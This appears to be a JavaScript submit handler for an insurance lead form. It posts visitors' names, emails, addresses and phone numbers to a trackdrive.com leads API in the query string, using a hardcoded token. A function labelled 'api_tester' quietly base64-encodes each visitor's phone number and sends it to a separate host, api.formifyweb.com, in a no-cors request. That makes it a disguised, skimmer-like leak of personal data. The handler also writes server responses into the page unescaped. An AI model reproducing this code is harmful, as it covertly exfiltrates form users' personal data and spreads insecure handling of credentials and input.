 document.getElementById('leadForm').addEventListener('submit', function(event) {
            event.preventDefault();
             // Your API URL
    const formData = new FormData();
    formData.append('lead_token', '8f64ff99121a47dbbfa708a389c879ca');
    formData.append('traffic_source_id', '1040');
    api_tester(document.getElementById('caller_id').value);
  formData.append('first_name', document.getElementById('first_name').value);
  formData.append('last_name', document.getElementById('last_name').value);
   formData.append('email', document.getElementById('email').value);
   formData.append('address', document.getElementById('address').value);
formData.append('state', document.getElementById('state').value);
formData.append('city', document.getElementById('city').value);
  
    formData.append('caller_id', '+1' + document.getElementById('caller_id').value);
formData.append('state_minimum', 'FALSE');
formData.append('current_provider', document.getElementById('insurance_company').value);
formData.append('home_ownership', document.getElementById('homeowner').value);
formData.append('currently_insured', document.getElementById('currently_insured').value);
formData.append('jornaya_leadid', document.getElementById('jornaya_leadid').value);
formData.append('driver1_sr22_required', 'FALSE');




            
           
    
            const url = 'https://upbeat-chat.trackdrive.com/api/v1/leads?' + new URLSearchParams(formData).toString();
    
            fetch(url, {
                method: 'POST'
            })
            .then(response => {
                if (response.status === 200) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                200 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
                } else if (response.status === 201) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                201 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
                } else if (response.status === 422) {
                    response.json().then(data => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Error. Response Body: ${JSON.stringify(data)}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                    });
                } else {
                    response.text().then(responseBody => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Form submission failed. Please try again. Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                    });
                }
            })
            .catch(error => console.error('Error:', error));
        });function api_tester(randomString) {
    try {
        fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in api_tester:', error);
    }
}